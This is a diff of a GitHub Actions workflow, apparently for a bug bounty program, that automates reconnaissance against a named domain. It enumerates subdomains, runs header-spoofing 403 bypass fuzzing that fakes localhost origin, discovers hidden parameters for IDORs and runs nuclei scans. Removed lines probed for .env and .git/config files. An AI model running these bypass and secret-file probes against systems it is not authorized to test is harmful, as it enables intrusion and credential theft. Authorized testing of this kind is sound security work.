@@ -1,59 +1,82 @@
-name: Bug Bounty Hunter - Auto-Verify & Fuzz
+name: Elite Fintech Hunter - Auto-Verify & Fuzz
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: 'Target Domain'
+        description: 'Target Domain (e.g., web-zaim.ru)'
         required: true
         default: 'web-zaim.ru'
+      bounty_header:
+        description: 'Program X-BugBounty Header'
+        required: true
+        default: '0a526762-8467-4d46-a403-af4e79283f46'
 
 jobs:
   exploit-hunt:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup Tools
+      - name: Setup Advanced Toolset
         run: |
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
           go install -v github.com/ffuf/ffuf/v2@latest
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Discovery & 403 Bypass Testing
+      - name: Multi-Stage Recon
         run: |
           TARGET="${{ github.event.inputs.target }}"
-          HEADER="X-BugBounty: 0a526762-8467-4d46-a403-af4e79283f46"
+          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
           
-          # 1. Get all subdomains
+          # 1. Subdomain Discovery
           subfinder -d $TARGET -silent -o subs.txt
           
-          # 2. Identify 403 Forbidden pages (Your 'Juicy' targets)
-          httpx -l subs.txt -H "$HEADER" -status-code -mc 403 -silent -o forbidden.txt
+          # 2. Tech-Aware Probing (Detects Tilda, IIS, Nginx)
+          httpx -l subs.txt -H "$FULL_HEADER" -status-code -td -silent -o live.txt
           
-          # 3. 403 Bypass Fuzzing (PoC Generator)
-          # We try common bypass headers like X-Forwarded-For and path manipulation
+          # 3. Filter 403 Forbidden pages for bypass testing
+          grep "403" live.txt | awk '{print $1}' > forbidden.txt
+
+      - name: Advanced 403 Bypass (Header Spoofing)
+        run: |
+          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
+          # Testing for internal trust bypasses (Localhost spoofing)
           while read -r url; do
             echo "Attempting Bypass on: $url"
             ffuf -u "$url/FUZZ" \
-                 -H "$HEADER" \
+                 -H "$FULL_HEADER" \
                  -H "X-Forwarded-For: 127.0.0.1" \
+                 -H "X-Real-IP: 127.0.0.1" \
                  -H "X-Original-URL: /admin" \
                  -w http://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt \
                  -mc 200,301,302 -t 5 -rate 5 -o "bypass_$(date +%s).json"
           done < forbidden.txt
 
-      - name: Sensitive File & API Hunt
+      - name: Hidden Parameter Discovery (Arjun)
         run: |
-          # Fuzzing for critical files (.env, config.php, .git, etc.)
-          # -rate 5 keeps us compliant with the 5 req/s rule
-          httpx -l subs.txt -H "$HEADER" -path "/.env","/.git/config","/swagger.json","/api/v1/users" -status-code -mc 200 -silent -o critical_files.txt
+          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
+          # Arjun finds hidden parameters (e.g., ?debug=true) that lead to IDORs
+          # Focus on the API and Marketplace subdomains you found
+          grep -E "api|marketplace" live.txt | awk '{print $1}' > high_value_targets.txt
+          while read -r url; do
+            arjun -u "$url" --headers "$FULL_HEADER" --rate-limit 5 -oJ "params_$(date +%s).json"
+          done < high_value_targets.txt
 
-      - name: Upload PoC Evidence
+      - name: Critical Vulnerability Scan (Nuclei)
+        run: |
+          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
+          # Runs 2026-updated templates for Critical/High bugs only
+          nuclei -l live.txt -H "$FULL_HEADER" -severity critical,high -rate-limit 5 -o nuclei_results.txt
+
+      - name: Upload Elite Evidence
         uses: actions/upload-artifact@v4
         with:
-          name: poc-results
+          name: elite-results-${{ github.event.inputs.target }}
           path: |
-            forbidden.txt
-            critical_files.txt
+            live.txt
+            nuclei_results.txt
+            params_*.json
             bypass_*.json
             
